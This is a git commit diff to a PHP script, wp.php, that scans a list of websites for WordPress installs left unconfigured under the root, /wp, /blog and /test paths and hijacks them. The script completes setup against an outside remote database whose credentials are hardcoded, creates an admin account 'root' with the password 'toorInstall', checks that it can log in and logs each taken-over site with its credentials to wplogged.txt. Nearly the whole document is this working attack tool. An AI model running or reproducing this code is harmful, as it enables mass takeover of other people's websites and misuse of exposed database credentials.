f83c3f317aa3dcb9f76f1c662da7dc4c34d44d47
xcapri <43540712+xcapri@users.noreply.github.com>
2020-04-14 21:47:41 +0700

    Update wp.php

--- wp.php
+++ wp.php
@@ -1,8 +1,8 @@
 <?php
 
-
 //wp install
 //By KangKlepfound
+//Thx stackoverflow :v
 
 function CurL($web)
 {
@@ -41,27 +41,20 @@ function cPost($url, $data)
 	return $jir;
 }
 /**
-Db example for remote
-
+Db example for remote =
 Username: yQMbpkKngT
-
 Database name: yQMbpkKngT
-
 Password: ixZa9LxLFj
-
 Server: remotemysql.com
-
 Port: 3306
-
 but powefull if u have db host with ip
-
 */
 //setup to ur config
 $setup_Config = array(
-	'dbname' => 'wp',           //change to ur dbname
-	'uname' => 'root',         //change to ur uname 
-	'pwd' => '',              //change to ur pwd
-	'dbhost' => 'localhost', //change to ur host ex:remotmysql.com:8080
+	'dbname' => 'yQMbpkKngT',           //change to ur dbname
+	'uname' => 'yQMbpkKngT',         //change to ur uname 
+	'pwd' => 'ixZa9LxLFj',              //change to ur pwd
+	'dbhost' => 'remotemysql.com:3306', //change to ur host ex:remotmysql.com:8080
 	'prefix' => 'wp_',
 	'language' => '',
 	'submit' => 'Submit');
@@ -72,8 +65,6 @@ Change in here
  				'admin_password' => 'toorInstall',   
  				'admin_password2' => 'toorInstall',  
 */
-$user_name = 'root';          
-$admin_password = 'toorInstall';
 
 $f = $argv[1];
 $file = file_get_contents($f);
@@ -83,16 +74,16 @@ foreach ($exp as $key) {
 	$i++;
  	$wp = $key.'/wp-admin/setup-config.php';
  	$pw = CurL($wp);
- 	if (preg_match_all("/already/", $pw)) {
+ 	$title = preg_match_all("/<title>(.*)<\/title>/is", $pw, $matches);
+ 	$itit = implode("", $matches[1]);
+ 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
  		echo " $key Already install!!\n";
- 	}elseif (preg_match_all("/English/", $pw)) {
+ 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
  		echo " $wp OK!\n";
  		echo "  Trying install\n";
- 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
  		$s = cPost($key.'/wp-admin/setup-config.php?step=0',[
  			'language'=>'']);
  		if ($s) {
-
  			$ss = cPost($key.'/wp-admin/setup-config.php?step=2',[
  				'dbname'=> $setup_Config['dbname'],  
  				'uname' => $setup_Config['uname'],       
@@ -101,7 +92,6 @@ foreach ($exp as $key) {
  				'prefix' => $setup_Config['prefix'],
  				'language' => $setup_Config['language'],
  				'submit' => $setup_Config['submit']]);
-
  			$bjir = cPost($key.'/wp-admin/install.php?step=2',[
  				'weblog_title' => 'Beauty of darknet', 
  				'user_name' => 'root',                
@@ -111,91 +101,42 @@ foreach ($exp as $key) {
  				'blog_public' => '1',
  				'Submit' => 'Install Wordpress',
  				'language' => 'en_US']);
- 			
  			$login = cPost($key,'/wp-login.php',[
  				'log' => 'root',
  				'pwd' => 'toorInstall',
  				'wp-submit' => 'Log In',
  				'redirect_to' => $key.'/wp-admin/',
  				'testcookie' =>'1']);
-
- 			// $plugin = CurL($key.'/wp-admin/index.php');
- 			if (!$login) {
- 				echo " $key Already install!\n";
- 			}else{
- 				echo "   $key/wp-login.php|{$user_name}|{$admin_password}\n";
+ 			$wpadmin = CurL($key,'/wp-admin/index.php');
+ 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
+ 			$admti = implode("", $matches[1]);
+ 			if (preg_match_all("/Beauty/",$admti)) {
+ 				echo "   $key/wp-login.php|root|toorInstall\n";
  	            $r = "wplogged.txt";
                 touch($r);
                 $w = fopen($r, "a");
-                $site = $key.'/wp-login.php|{$user_name}|{$admin_password}';
-                fwrite($w, $site."\n");
-                fclose($w);			
- 			}
- 		}
-
- 	}elseif (preg_match_all("/Database/", $pw)) {
- 		echo " $wp OK!\n";
- 		echo "  Trying install\n";
- 		$s = cPost($key.'/wp-admin/setup-config.php?step=0',[
- 			'language'=>'']);
- 		if ($s) {
-		
- 			$ss = cPost($key.'/wp-admin/setup-config.php?step=2',[
- 				'dbname'=> $setup_Config['dbname'],  
- 				'uname' => $setup_Config['uname'],       
- 				'pwd' => $setup_Config['pwd'],            
- 				'dbhost' => $setup_Config['dbhost'], 
- 				'prefix' => $setup_Config['prefix'],
- 				'language' => $setup_Config['language'],
- 				'submit' => $setup_Config['submit']]);
-
-
- 			$bjir = cPost($key.'/wp-admin/install.php?step=2',[
- 				'weblog_title' =>'Beauty of darknet', 
- 				'user_name' => 'root',                
- 				'admin_password' => 'toorInstall',   
- 				'admin_password2' => 'toorInstall',   
- 				'admin_email' => 'toor@ro.ot',    
- 				'blog_public' => '1',
- 				'Submit' => 'Install Wordpress',
- 				'language' => 'en_US']);
- 			
- 			$login = cPost($key,'/wp-login.php',[
- 				'log' => 'root',
- 				'pwd' => 'toorInstall',
- 				'wp-submit' => 'Log In',
- 				'redirect_to' => $key.'/wp-admin/',
- 				'testcookie' =>'1']);
- 			//cek logged
- 			// $plugin = CurL($key.'/wp-admin/index.php');
- 			if (!$login) {
- 				echo " $key Already install!\n";
- 			}else{
- 				echo "   $key/wp-login.php|{$user_name}|{$admin_password}\n";
- 	            $r = "wplogged.txt";
-                touch($r);
-                $w = fopen($r, "a");
-                $site = $key.'/wp-login.php|{$user_name}|{$admin_password}';
+                $site = $key.'/wp-login.php|root|toorInstall';
                 fwrite($w, $site."\n");
                 fclose($w);	
+ 			}else{
+ 				echo "   $key/wp-login.php Cant Login!\n";
  			}
- 			
  		}
  	}else{
- 		echo " $key NOT WP!\n";
+ 		echo " $wp NOT WP!\n";
  	}
  	$wpp = $key.'/wp/wp-admin/setup-config.php';
  	$ppw = CurL($wpp);
- 	if (preg_match_all("/Already/", $ppw)) {
+ 	$title = preg_match_all("/<title>(.*)<\/title>/is", $ppw, $matches);
+ 	$itit = implode("", $matches[1]); 	
+ 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
  		echo " $wpp Already install!!\n";
- 	}elseif (preg_match_all("/English/", $ppw)) {
+ 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
  		echo " $wpp OK!\n";
  		echo "  Trying install\n";
- 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
  		$s = cPost($key.'/wp/wp-admin/setup-config.php?step=0',[
  			'language'=>'']);
  		if ($s) {
-
  			$ss = cPost($key.'/wp/wp-admin/setup-config.php?step=2',[
  				'dbname'=> $setup_Config['dbname'],  
  				'uname' => $setup_Config['uname'],       
@@ -204,7 +145,6 @@ foreach ($exp as $key) {
  				'prefix' => $setup_Config['prefix'],
  				'language' => $setup_Config['language'],
  				'submit' => $setup_Config['submit']]);
-
  			$bjir = cPost($key.'/wp/wp-admin/install.php?step=2',[
  				'weblog_title' =>'Beauty of darknet', 
  				'user_name' => 'root',                
@@ -214,91 +154,42 @@ foreach ($exp as $key) {
  				'blog_public' => '1',
  				'Submit' => 'Install Wordpress',
  				'language' => 'en_US']);
- 			
  			$login = cPost($key,'/wp/wp-login.php',[
  				'log' => 'root',
  				'pwd' => 'toorInstall',
  				'wp-submit' => 'Log In',
  				'redirect_to' => $key.'/wp/wp-admin/',
  				'testcookie' =>'1']);
- 			//cek logged
- 			// $plugin = CurL($key.'/wp-admin/index.php');
- 			if (!$login) {
- 				echo " $wpp Already install!\n";
- 			}else{
- 				echo "   $key/wp/wp-login.php|{$user_name}|{$admin_password}\n";
+ 			$wpadmin = CurL($key,'/wp/wp-admin/index.php');
+ 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
+ 			$admti = implode("", $matches[1]);
+ 			if (preg_match_all("/Beauty/",$admti)) {
+ 				echo "   $key/wp/wp-login.php|root|toorInstall\n";
  	            $r = "wplogged.txt";
                 touch($r);
                 $w = fopen($r, "a");
-                $site = $key.'/wp/wp-login.php|{$user_name}|{$admin_password}';
+                $site = $key.'/wp/wp-login.php|root|toorInstall';
                 fwrite($w, $site."\n");
                 fclose($w);	
- 			}
- 			
- 		}
- 	}elseif (preg_match_all("/Database/", $ppw)) {
- 		echo " $wpp OK!\n";
- 		echo "  Trying install\n";
- 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
- 		$s = cPost($key.'/wp/wp-admin/setup-config.php?step=0',[
- 			'language'=>'']);
- 		if ($s) {
-
- 			$ss = cPost($key.'/wp/wp-admin/setup-config.php?step=2',[
- 				'dbname'=> $setup_Config['dbname'],  
- 				'uname' => $setup_Config['uname'],       
- 				'pwd' => $setup_Config['pwd'],            
- 				'dbhost' => $setup_Config['dbhost'], 
- 				'prefix' => $setup_Config['prefix'],
- 				'language' => $setup_Config['language'],
- 				'submit' => $setup_Config['submit']]);
-
- 			$bjir = cPost($key.'/wp/wp-admin/install.php?step=2',[
- 				'weblog_title' =>'Beauty of darknet', 
- 				'user_name' => 'root',                
- 				'admin_password' => 'toorInstall',   
- 				'admin_password2' => 'toorInstall',   
- 				'admin_email' => 'toor@ro.ot',    
- 				'blog_public' => '1',
- 				'Submit' => 'Install Wordpress',
- 				'language' => 'en_US']);
- 			
- 			$login = cPost($key,'/wp/wp-login.php',[
- 				'log' => 'root',
- 				'pwd' => 'toorInstall',
- 				'wp-submit' => 'Log In',
- 				'redirect_to' => $key.'/wp/wp-admin/',
- 				'testcookie' =>'1']);
- 			//cek logged
- 			// $plugin = CurL($key.'/wp-admin/index.php');
- 			if (!$login) {
- 				echo " $wpp Already install!\n";
  			}else{
- 				echo "   $key/wp/wp-login.php|{$user_name}|{$admin_password}\n";
- 	            $r = "wplogged.txt";
-                touch($r);
-                $w = fopen($r, "a");
-                $site = $key.'/wp/wp-login.php|{$user_name}|{$admin_password}';
-                fwrite($w, $site."\n");
-                fclose($w);	
+ 				echo "   $key/wp/wp-login.php Cant Login!\n";
  			}
- 			
  		}
  	}else{
  		echo " $wpp NOT WP!\n";
  	}
  	$blog = $key.'/blog/wp-admin/setup-config.php';
  	$wppp = CurL($blog);
- 	if (preg_match_all("/Already/", $wppp)) {
- 		echo " $blog Already install!";
- 	}elseif (preg_match_all("/English/", $wppp)) {
+ 	$title = preg_match_all("/<title>(.*)<\/title>/is", $wppp, $matches);
+ 	$itit = implode("", $matches[1]);  	
+ 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
+ 		echo " $blog Already install!\n";
+ 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
  		echo " $blog OK!\n";
  		echo "  Trying install\n";
- 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
  		$s = cPost($key.'/blog/wp-admin/setup-config.php?step=0',[
  			'language'=>'']);
  		if ($s) {
-
  			$ss = cPost($key.'/blog/wp-admin/setup-config.php?step=2',[
  				'dbname'=> $setup_Config['dbname'],  
  				'uname' => $setup_Config['uname'],       
@@ -307,8 +198,6 @@ foreach ($exp as $key) {
  				'prefix' => $setup_Config['prefix'],
  				'language' => $setup_Config['language'],
  				'submit' => $setup_Config['submit']]);
-
-
  			$bjir = cPost($key.'/blog/wp-admin/install.php?step=2',[
  				'weblog_title' =>'Beauty of darknet', 
  				'user_name' => 'root',                
@@ -318,79 +207,81 @@ foreach ($exp as $key) {
  				'blog_public' => '1',
  				'Submit' => 'Install Wordpress',
  				'language' => 'en_US']);
- 			
  			$login = cPost($key,'/blog/wp-login.php',[
  				'log' => 'root',
  				'pwd' => 'toorInstall',
  				'wp-submit' => 'Log In',
  				'redirect_to' => $key.'/blog/wp-admin/',
  				'testcookie' =>'1']);
- 			//cek logged
- 			// $plugin = CurL($key.'/wp-admin/index.php');
- 			if (!$login) {
- 				echo " $blog Already install!\n";
- 			}else{
- 				echo "   $key/blog/wp-login.php|{$user_name}|{$admin_password}\n";
+ 			$wpadmin = CurL($key,'/blog/wp-admin/index.php');
+ 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
+ 			$admti = implode("", $matches[1]);
+ 			if (preg_match_all("/Beauty/",$admti)) {
+ 				echo "   $key/blog/wp-login.php|root|toorInstall\n";
  	            $r = "wplogged.txt";
                 touch($r);
                 $w = fopen($r, "a");
-                $site = $key.'/blog/wp-login.php|{$user_name}|{$admin_password}';
+                $site = $key.'/blog/wp-login.php|root|toorInstall';
                 fwrite($w, $site."\n");
                 fclose($w);	
- 			}
- 			
- 		}
- 	}elseif (preg_match_all("/Database/", $wppp)) {
- 		echo " $blog OK!\n";
- 		echo "  Trying install\n";
- 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
- 		$s = cPost($key.'/blog/wp-admin/setup-config.php?step=0',[
- 			'language'=>'']);
- 		if ($s) {
-
- 			$ss = cPost($key.'/blog/wp-admin/setup-config.php?step=2',[
- 				'dbname'=> $setup_Config['dbname'],  
- 				'uname' => $setup_Config['uname'],       
- 				'pwd' => $setup_Config['pwd'],            
- 				'dbhost' => $setup_Config['dbhost'], 
- 				'prefix' => $setup_Config['prefix'],
- 				'language' => $setup_Config['language'],
- 				'submit' => $setup_Config['submit']]);
-
-
- 			$bjir = cPost($key.'/blog/wp-admin/install.php?step=2',[
- 				'weblog_title' =>'Beauty of darknet', 
- 				'user_name' => 'root',                
- 				'admin_password' => 'toorInstall',   
- 				'admin_password2' => 'toorInstall',   
- 				'admin_email' => 'toor@ro.ot',    
- 				'blog_public' => '1',
- 				'Submit' => 'Install Wordpress',
- 				'language' => 'en_US']);
- 			
- 			$login = cPost($key,'/blog/wp-login.php',[
- 				'log' => 'root',
- 				'pwd' => 'toorInstall',
- 				'wp-submit' => 'Log In',
- 				'redirect_to' => $key.'/blog/wp-admin/',
- 				'testcookie' =>'1']);
- 			//cek logged
- 			// $plugin = CurL($key.'/wp-admin/index.php');
- 			if (!$login) {
- 				echo " $blog Already install!\n";
  			}else{
- 				echo "   $key/blog/wp-login.php|{$user_name}|{$admin_password}\n";
- 	            $r = "wplogged.txt";
-                touch($r);
-                $w = fopen($r, "a");
-                $site = $key.'/blog/wp-login.php|{$user_name}|{$admin_password}';
-                fwrite($w, $site."\n");
-                fclose($w);	
+ 				echo "   $key/blog/wp-login.php Cant Login!\n";
  			}
- 			
  		}
  	}else{
  		echo " $blog NOT WP!\n";
  	}
-
+ 	$tt = $key.'/test/wp-admin/setup-config.php';
+ 	$test = CurL($tt);
+ 	$title = preg_match_all("/<title>(.*)<\/title>/is", $test, $matches);
+ 	$itit = implode("", $matches[1]);  	
+ 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
+ 		echo " $tt Already install!\n";
+ 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
+ 		echo " $tt OK!\n";
+ 		echo "  Trying install\n";
+ 		$s = cPost($key.'/test/wp-admin/setup-config.php?step=0',[
+ 			'language'=>'']);
+ 		if ($s) {
+ 			$ss = cPost($key.'/test/wp-admin/setup-config.php?step=2',[
+ 				'dbname'=> $setup_Config['dbname'],  
+ 				'uname' => $setup_Config['uname'],       
+ 				'pwd' => $setup_Config['pwd'],            
+ 				'dbhost' => $setup_Config['dbhost'], 
+ 				'prefix' => $setup_Config['prefix'],
+ 				'language' => $setup_Config['language'],
+ 				'submit' => $setup_Config['submit']]);
+ 			$bjir = cPost($key.'/test/wp-admin/install.php?step=2',[
+ 				'weblog_title' =>'Beauty of darknet', 
+ 				'user_name' => 'root',                
+ 				'admin_password' => 'toorInstall',   
+ 				'admin_password2' => 'toorInstall',   
+ 				'admin_email' => 'toor@ro.ot',    
+ 				'blog_public' => '1',
+ 				'Submit' => 'Install Wordpress',
+ 				'language' => 'en_US']);
+ 			$login = cPost($key,'/test/wp-login.php',[
+ 				'log' => 'root',
+ 				'pwd' => 'toorInstall',
+ 				'wp-submit' => 'Log In',
+ 				'redirect_to' => $key.'/test/wp-admin/',
+ 				'testcookie' =>'1']);
+ 			$wpadmin = CurL($key,'/test/wp-admin/index.php');
+ 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
+ 			$admti = implode("", $matches[1]);
+ 			if (preg_match_all("/Beauty/",$admti)) {
+ 				echo "   $key/test/wp-login.php|root|toorInstall\n";
+ 	            $r = "wplogged.txt";
+                touch($r);
+                $w = fopen($r, "a");
+                $site = $key.'/test/wp-login.php|root|toorInstall';
+                fwrite($w, $site."\n");
+                fclose($w);	
+ 			}else{
+ 				echo "   $key/test/wp-login.php Cant Login!\n";
+ 			}
+ 		}
+ 	}else{
+ 		echo " $tt NOT WP!\n";
+ 	}
  } 
